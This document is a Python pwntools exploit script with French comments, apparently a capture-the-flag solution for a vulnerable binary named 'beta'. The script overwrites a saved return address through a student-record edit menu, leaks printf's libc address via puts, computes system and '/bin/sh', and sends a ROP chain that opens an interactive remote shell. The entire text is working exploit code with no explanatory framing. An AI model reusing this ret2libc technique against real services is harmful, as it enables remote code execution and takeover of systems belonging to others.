#!/bin/env python3

from pwn import *

def executer_une_rop_chain(io, rop_chain, readline):
    sauvegarde_eip_de_la_fonction_server_par_rapport_au_pointeur_sur_la_classe = 0x0000001e # (0xfffe63bc (&ret_server) - 0xfffe58f0 (&classe)) / 0x5a

    if (readline == True):
        io.readline()

    io.sendline(b"3") # On passe en mode "Édition de l'étudiant"
    io.readline()
    io.sendline(bytes(str(sauvegarde_eip_de_la_fonction_server_par_rapport_au_pointeur_sur_la_classe), "utf-8")) # Numéro de l'étudiant
    io.readline()
    io.sendline(b"") # Prénom de l'étudiant
    io.readline()
    io.sendline(b"") # Nom de l'étudiant
    io.readline()
    io.sendline(b"a" * 4 + rop_chain) # Ville de l'étudiant
    io.readline()
    io.sendline(b"5") # Redémarrage du serveur

binary = "./beta"

addr_puts_plt = 0x08049090
addr_main = 0x08049857
addr_printf_got = 0x0804c010

context.terminal = ["/bin/gnome-terminal", "--"]

if args["SERVER"]:
    libc = ELF("./libc.so.6")
    io = remote(args["SERVER"], 50012)
else:
    libc = ELF("/lib/libc.so.6")
    p = ELF(binary)
    io = p.process()
    #io = p.debug(gdbscript="gef config context.nb_lines_stack 100\nbr server\nbr *0x08049831")

# Première étape : Modification de la valeur de sauvegarde du registre eip à la sortie de la fonction server pour avoir une adresse de la libc
executer_une_rop_chain(io, p32(addr_puts_plt) + p32(addr_main) + p32(addr_printf_got), True)

# Deuxième étape : Récupération et calcul des adresses utiles dans la libc
io.recvuntil(b"\n\nREBOOTING...\n\n")
adresse_recue = io.recv()
log.info("Adresse reçue : " + str(adresse_recue))
addr_printf_dans_le_programme = u32(adresse_recue[0:4])
log.info("Adresse de printf dans le programme : " + str(hex(addr_printf_dans_le_programme)))

addr_system_dans_le_programme = addr_printf_dans_le_programme - libc.symbols["printf"] + libc.symbols["system"]
addr_bin_sh_dans_le_programme = addr_printf_dans_le_programme - libc.symbols["printf"] + next(libc.search(b"/bin/sh\x00"))

log.info("Adresse de system dans le programme : " + str(hex(addr_system_dans_le_programme)))
log.info("Adresse de \"/bin/sh\" dans le programme : " + str(hex(addr_bin_sh_dans_le_programme)))

# Troisième étape : Lancement du shell
executer_une_rop_chain(io, p32(addr_system_dans_le_programme) + p32(addr_main) + p32(addr_bin_sh_dans_le_programme), False)

io.interactive()
